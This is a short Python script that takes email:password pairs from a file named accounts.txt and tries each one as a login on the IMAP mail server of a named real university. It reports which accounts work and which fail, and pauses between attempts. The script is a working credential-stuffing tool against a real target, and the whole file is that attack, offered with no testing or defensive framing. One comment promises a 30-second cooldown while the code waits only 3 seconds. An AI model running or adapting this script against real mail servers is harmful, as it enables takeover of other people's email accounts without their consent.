import imaplib
import time

# Bilkent Webmail IMAP Server Information
IMAP_SERVER = "mail.bilkent.edu.tr"
IMAP_PORT = 993  # SSL Connection

# File path
input_file = "accounts.txt"

# Read accounts and attempt login
def check_accounts():
    try:
        with open(input_file, "r", encoding="utf-8") as file:
            accounts = [line.strip() for line in file if line.strip()]

        for account in accounts:
            try:
                email, password = account.split(":")
                print(f"[+] Trying to log in with {email}...")

                mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
                mail.login(email, password)
                mail.logout()
                
                print(f"\033[92m[✓] Login successful for {email}!\033[0m")  # Green color

            except imaplib.IMAP4.error:
                print(f"\033[91m[✗] Login failed for {email}!\033[0m")  # Red color

            # **30-second cooldown**
            print("[!] Waiting for 3 seconds...\n")
            time.sleep(3)

    except FileNotFoundError:
        print(f"[!] Error: {input_file} not found. Please check the file path.")

if __name__ == "__main__":
    check_accounts()
